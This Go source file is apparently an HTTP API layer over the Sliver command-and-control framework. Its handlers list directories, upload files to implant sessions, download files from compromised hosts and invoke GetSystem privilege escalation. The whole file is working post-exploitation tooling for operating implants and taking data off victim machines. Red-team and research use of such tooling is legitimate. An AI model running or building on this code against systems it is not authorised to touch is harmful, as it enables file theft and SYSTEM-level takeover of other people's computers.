package main

import (
	"bytes"
	"compress/gzip"
	"context"
	"fmt"
	"io"
	"net/http"
	"path"
	"time"

	"github.com/bishopfox/sliver/protobuf/clientpb"
	"github.com/bishopfox/sliver/protobuf/commonpb"
	"github.com/bishopfox/sliver/protobuf/rpcpb"
	"github.com/bishopfox/sliver/protobuf/sliverpb"
)

func (s *Server) ls(w http.ResponseWriter, r *http.Request) {
	id := r.PathValue("id")
	var body struct {
		Path string `json:"path"`
	}
	if err := decode(r, &body); err != nil {
		writeErr(w, http.StatusBadRequest, err.Error())
		return
	}
	client, err := s.mgr.Client()
	if err != nil {
		writeErr(w, http.StatusServiceUnavailable, err.Error())
		return
	}
	ctx, cancel := context.WithTimeout(r.Context(), 20*time.Second)
	defer cancel()

	resp, err := client.Ls(ctx, &sliverpb.LsReq{
		Path:    body.Path,
		Request: &commonpb.Request{SessionID: id},
	})
	if err != nil {
		writeErr(w, http.StatusBadGateway, err.Error())
		return
	}
	if resp.Response != nil && resp.Response.Err != "" {
		writeErr(w, http.StatusBadGateway, resp.Response.Err)
		return
	}
	files := make([]map[string]any, 0, len(resp.Files))
	for _, f := range resp.Files {
		files = append(files, map[string]any{
			"name":   f.Name,
			"is_dir": f.IsDir,
			"size":   f.Size,
			"mod":    f.ModTime,
			"mode":   f.Mode,
			"link":   f.Link,
			"uid":    f.Uid,
			"gid":    f.Gid,
		})
	}
	writeJSON(w, http.StatusOK, map[string]any{"path": resp.Path, "exists": resp.Exists, "files": files})
}

func (s *Server) upload(w http.ResponseWriter, r *http.Request) {
	id := r.PathValue("id")
	client, err := s.mgr.Client()
	if err != nil {
		writeErr(w, http.StatusServiceUnavailable, err.Error())
		return
	}
	if err := r.ParseMultipartForm(64 << 20); err != nil {
		writeErr(w, http.StatusBadRequest, err.Error())
		return
	}
	remoteDir := r.FormValue("path")
	file, header, err := r.FormFile("file")
	if err != nil {
		writeErr(w, http.StatusBadRequest, err.Error())
		return
	}
	defer func() { _ = file.Close() }()
	data, err := io.ReadAll(file)
	if err != nil {
		writeErr(w, http.StatusBadRequest, err.Error())
		return
	}

	ctx, cancel := context.WithTimeout(r.Context(), 60*time.Second)
	defer cancel()
	resp, err := client.Upload(ctx, &sliverpb.UploadReq{
		Path:      path.Join(remoteDir, header.Filename),
		FileName:  header.Filename,
		Data:      data,
		Overwrite: true,
		Request:   &commonpb.Request{SessionID: id},
	})
	if err != nil {
		writeErr(w, http.StatusBadGateway, err.Error())
		return
	}
	if resp.Response != nil && resp.Response.Err != "" {
		writeErr(w, http.StatusBadGateway, resp.Response.Err)
		return
	}
	writeJSON(w, http.StatusOK, map[string]any{"ok": true, "path": resp.Path, "written": resp.WrittenFiles})
}

func (s *Server) download(w http.ResponseWriter, r *http.Request) {
	id := r.PathValue("id")
	remotePath := r.URL.Query().Get("path")
	client, err := s.mgr.Client()
	if err != nil {
		writeErr(w, http.StatusServiceUnavailable, err.Error())
		return
	}
	ctx, cancel := context.WithTimeout(r.Context(), 120*time.Second)
	defer cancel()

	payload, err := downloadAll(ctx, client, id, remotePath)
	if err != nil {
		writeErr(w, http.StatusBadGateway, err.Error())
		return
	}
	w.Header().Set("Content-Type", "application/octet-stream")
	w.Header().Set("Content-Disposition", fmt.Sprintf("attachment; filename=%q", path.Base(remotePath)))
	_, _ = w.Write(payload)
}

// download fetches a single file, mirroring the console: one Download RPC with
// the path restricted to a file, plus gzip decode when the implant compresses.
func downloadAll(ctx context.Context, client rpcpb.SliverRPCClient, id, remotePath string) ([]byte, error) {
	resp, err := client.Download(ctx, &sliverpb.DownloadReq{
		Path:             remotePath,
		RestrictedToFile: true,
		Request:          &commonpb.Request{SessionID: id},
	})
	if err != nil {
		return nil, err
	}
	if resp.Response != nil && resp.Response.Err != "" {
		return nil, fmt.Errorf("%s", resp.Response.Err)
	}
	if !resp.Exists {
		return nil, fmt.Errorf("no such file: %s", remotePath)
	}
	data := resp.Data
	if resp.Encoder == "gzip" {
		reader, gzErr := gzip.NewReader(bytes.NewReader(data))
		if gzErr != nil {
			return nil, gzErr
		}
		defer func() { _ = reader.Close() }()
		data, err = io.ReadAll(reader)
		if err != nil {
			return nil, err
		}
	}
	return data, nil
}

func (s *Server) getsystem(w http.ResponseWriter, r *http.Request) {
	id := r.PathValue("id")
	client, err := s.mgr.Client()
	if err != nil {
		writeErr(w, http.StatusServiceUnavailable, err.Error())
		return
	}
	hosting := r.URL.Query().Get("hosting_process")
	name := r.URL.Query().Get("name")
	if name == "" {
		name = "fleet-system"
	}
	ctx, cancel := context.WithTimeout(r.Context(), 60*time.Second)
	defer cancel()
	resp, err := client.GetSystem(ctx, &clientpb.GetSystemReq{
		HostingProcess: hosting,
		Name:           name,
		Request:        &commonpb.Request{SessionID: id},
	})
	if err != nil {
		writeErr(w, http.StatusBadGateway, err.Error())
		return
	}
	if resp.Response != nil && resp.Response.Err != "" {
		writeErr(w, http.StatusBadGateway, resp.Response.Err)
		return
	}
	writeJSON(w, http.StatusOK, map[string]any{"ok": true, "name": name})
}
